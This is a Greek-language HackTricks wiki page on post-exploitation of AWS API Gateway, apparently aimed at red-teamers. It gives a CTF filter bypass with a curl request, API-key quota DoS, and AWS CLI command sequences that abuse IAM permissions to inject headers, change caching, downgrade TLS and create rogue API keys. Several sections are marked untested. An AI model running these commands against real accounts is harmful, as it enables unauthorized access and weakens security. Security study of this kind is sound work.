# AWS - API Gateway Post Exploitation

{% hint style="success" %}
Μάθετε και εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε και εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Γίνετε μέλος της** 💬 [**ομάδας Discord**](https://discord.gg/hRep4RUj7f) ή της [**ομάδας telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}

## API Gateway

Για περισσότερες πληροφορίες ελέγξτε:

{% content-ref url="../aws-services/aws-api-gateway-enum.md" %}
[aws-api-gateway-enum.md](../aws-services/aws-api-gateway-enum.md)
{% endcontent-ref %}

### Πρόσβαση σε μη εκτεθειμένα APIs

Μπορείτε να δημιουργήσετε ένα endpoint στο [https://us-east-1.console.aws.amazon.com/vpc/home#CreateVpcEndpoint](https://us-east-1.console.aws.amazon.com/vpc/home?region=us-east-1#CreateVpcEndpoint:) με την υπηρεσία `com.amazonaws.us-east-1.execute-api`, να εκθέσετε το endpoint σε ένα δίκτυο όπου έχετε πρόσβαση (πιθανώς μέσω μιας EC2 μηχανής) και να αναθέσετε μια ομάδα ασφαλείας που επιτρέπει όλες τις συνδέσεις.\
Στη συνέχεια, από την EC2 μηχανή θα μπορείτε να έχετε πρόσβαση στο endpoint και επομένως να καλέσετε το gateway API που δεν ήταν εκτεθειμένο πριν.

### Παράκαμψη του Request body passthrough

Αυτή η τεχνική βρέθηκε σε [**αυτό το CTF writeup**](https://blog-tyage-net.translate.goog/post/2023/2023-09-03-midnightsun/?\_x\_tr\_sl=en&\_x\_tr\_tl=es&\_x\_tr\_hl=en&\_x\_tr\_pto=wapp).

Όπως αναφέρεται στην [**τεκμηρίωση του AWS**](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-apigateway-method-integration.html) στην ενότητα `PassthroughBehavior`, από προεπιλογή, η τιμή **`WHEN_NO_MATCH`** , όταν ελέγχει την κεφαλίδα **Content-Type** του αιτήματος, θα περάσει το αίτημα στο back end χωρίς μετασχηματισμό.

Επομένως, στο CTF το API Gateway είχε ένα integration template που **απέτρεπε την εξαγωγή της σημαίας** σε μια απάντηση όταν ένα αίτημα στάλθηκε με `Content-Type: application/json`:

{% code overflow="wrap" %}
```yaml
RequestTemplates:
application/json: '{"TableName":"Movies","IndexName":"MovieName-Index","KeyConditionExpression":"moviename=:moviename","FilterExpression": "not contains(#description, :flagstring)","ExpressionAttributeNames": {"#description": "description"},"ExpressionAttributeValues":{":moviename":{"S":"$util.escapeJavaScript($input.params(''moviename''))"},":flagstring":{"S":"midnight"}}}'
```
{% endcode %}

Ωστόσο, η αποστολή ενός αιτήματος με **`Content-type: text/json`** θα απέτρεπε αυτό το φίλτρο.&#x20;

Τέλος, καθώς το API Gateway επέτρεπε μόνο `Get` και `Options`, ήταν δυνατό να σταλεί ένα αυθαίρετο ερώτημα dynamoDB χωρίς κανένα όριο στέλνοντας ένα POST αίτημα με το ερώτημα στο σώμα και χρησιμοποιώντας την κεφαλίδα `X-HTTP-Method-Override: GET`:

{% code overflow="wrap" %}
```bash
curl https://vu5bqggmfc.execute-api.eu-north-1.amazonaws.com/prod/movies/hackers -H 'X-HTTP-Method-Override: GET' -H 'Content-Type: text/json'  --data '{"TableName":"Movies","IndexName":"MovieName-Index","KeyConditionExpression":"moviename = :moviename","ExpressionAttributeValues":{":moviename":{"S":"hackers"}}}'
```
{% endcode %}

### Usage Plans DoS

Στην ενότητα **Enumeration** μπορείτε να δείτε πώς να **αποκτήσετε το usage plan** των κλειδιών. Εάν έχετε το κλειδί και είναι **περιορισμένο** σε Χ χρήσεις **ανά μήνα**, μπορείτε **απλά να το χρησιμοποιήσετε και να προκαλέσετε DoS**.

Το **API Key** χρειάζεται απλώς να **συμπεριληφθεί** μέσα σε μια **HTTP header** που ονομάζεται **`x-api-key`**.

### `apigateway:UpdateGatewayResponse`, `apigateway:CreateDeployment`

Ένας επιτιθέμενος με τα δικαιώματα `apigateway:UpdateGatewayResponse` και `apigateway:CreateDeployment` μπορεί να **τροποποιήσει μια υπάρχουσα Gateway Response για να συμπεριλάβει προσαρμοσμένες κεφαλίδες ή πρότυπα απαντήσεων που διαρρέουν ευαίσθητες πληροφορίες ή εκτελούν κακόβουλα scripts**.

{% code overflow="wrap" %}
```bash
API_ID="your-api-id"
RESPONSE_TYPE="DEFAULT_4XX"

# Update the Gateway Response
aws apigateway update-gateway-response --rest-api-id $API_ID --response-type $RESPONSE_TYPE --patch-operations op=replace,path=/responseTemplates/application~1json,value="{\"message\":\"$context.error.message\", \"malicious_header\":\"malicious_value\"}"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
{% endcode %}

**Πιθανός Αντίκτυπος**: Διαρροή ευαίσθητων πληροφοριών, εκτέλεση κακόβουλων scripts, ή μη εξουσιοδοτημένη πρόσβαση σε πόρους API.

{% hint style="info" %}
Απαιτείται δοκιμή
{% endhint %}

### `apigateway:UpdateStage`, `apigateway:CreateDeployment`

Ένας επιτιθέμενος με τις άδειες `apigateway:UpdateStage` και `apigateway:CreateDeployment` μπορεί **να τροποποιήσει ένα υπάρχον στάδιο API Gateway για να ανακατευθύνει την κίνηση σε διαφορετικό στάδιο ή να αλλάξει τις ρυθμίσεις caching για να αποκτήσει μη εξουσιοδοτημένη πρόσβαση σε αποθηκευμένα δεδομένα**.

{% code overflow="wrap" %}
```bash
API_ID="your-api-id"
STAGE_NAME="Prod"

# Update the API Gateway stage
aws apigateway update-stage --rest-api-id $API_ID --stage-name $STAGE_NAME --patch-operations op=replace,path=/cacheClusterEnabled,value=true,op=replace,path=/cacheClusterSize,value="0.5"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
{% endcode %}

**Πιθανός Αντίκτυπος**: Μη εξουσιοδοτημένη πρόσβαση σε αποθηκευμένα δεδομένα, διακοπή ή υποκλοπή της κυκλοφορίας API.

{% hint style="info" %}
Απαιτείται δοκιμή
{% endhint %}

### `apigateway:PutMethodResponse`, `apigateway:CreateDeployment`

Ένας επιτιθέμενος με τα δικαιώματα `apigateway:PutMethodResponse` και `apigateway:CreateDeployment` μπορεί να **τροποποιήσει την απόκριση μεθόδου μιας υπάρχουσας μεθόδου API Gateway REST API για να συμπεριλάβει προσαρμοσμένες κεφαλίδες ή πρότυπα απόκρισης που διαρρέουν ευαίσθητες πληροφορίες ή εκτελούν κακόβουλα σενάρια**.
```bash
API_ID="your-api-id"
RESOURCE_ID="your-resource-id"
HTTP_METHOD="GET"
STATUS_CODE="200"

# Update the method response
aws apigateway put-method-response --rest-api-id $API_ID --resource-id $RESOURCE_ID --http-method $HTTP_METHOD --status-code $STATUS_CODE --response-parameters "method.response.header.malicious_header=true"

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Πιθανός Αντίκτυπος**: Διαρροή ευαίσθητων πληροφοριών, εκτέλεση κακόβουλων scripts, ή μη εξουσιοδοτημένη πρόσβαση σε πόρους API.

{% hint style="info" %}
Ανάγκη για δοκιμή
{% endhint %}

### `apigateway:UpdateRestApi`, `apigateway:CreateDeployment`

Ένας επιτιθέμενος με τις άδειες `apigateway:UpdateRestApi` και `apigateway:CreateDeployment` μπορεί να **τροποποιήσει τις ρυθμίσεις του API Gateway REST API για να απενεργοποιήσει την καταγραφή ή να αλλάξει την ελάχιστη έκδοση TLS, ενδεχομένως αποδυναμώνοντας την ασφάλεια του API**.
```bash
API_ID="your-api-id"

# Update the REST API settings
aws apigateway update-rest-api --rest-api-id $API_ID --patch-operations op=replace,path=/minimumTlsVersion,value='TLS_1.0',op=replace,path=/apiKeySource,value='AUTHORIZER'

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Πιθανός Αντίκτυπος**: Αποδυνάμωση της ασφάλειας του API, ενδεχομένως επιτρέποντας μη εξουσιοδοτημένη πρόσβαση ή έκθεση ευαίσθητων πληροφοριών.

{% hint style="info" %}
Ανάγκη για δοκιμή
{% endhint %}

### `apigateway:CreateApiKey`, `apigateway:UpdateApiKey`, `apigateway:CreateUsagePlan`, `apigateway:CreateUsagePlanKey`

Ένας επιτιθέμενος με δικαιώματα `apigateway:CreateApiKey`, `apigateway:UpdateApiKey`, `apigateway:CreateUsagePlan`, και `apigateway:CreateUsagePlanKey` μπορεί να **δημιουργήσει νέα API keys, να τα συσχετίσει με usage plans, και στη συνέχεια να χρησιμοποιήσει αυτά τα keys για μη εξουσιοδοτημένη πρόσβαση σε APIs**.
```bash
# Create a new API key
API_KEY=$(aws apigateway create-api-key --enabled --output text --query 'id')

# Create a new usage plan
USAGE_PLAN=$(aws apigateway create-usage-plan --name "MaliciousUsagePlan" --output text --query 'id')

# Associate the API key with the usage plan
aws apigateway create-usage-plan-key --usage-plan-id $USAGE_PLAN --key-id $API_KEY --key-type API_KEY
```
**Πιθανός Αντίκτυπος**: Μη εξουσιοδοτημένη πρόσβαση σε πόρους API, παράκαμψη ελέγχων ασφαλείας.

{% hint style="info" %}
Ανάγκη για δοκιμή
{% endhint %}

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Γίνετε μέλος της** 💬 [**ομάδας Discord**](https://discord.gg/hRep4RUj7f) ή της [**ομάδας telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}
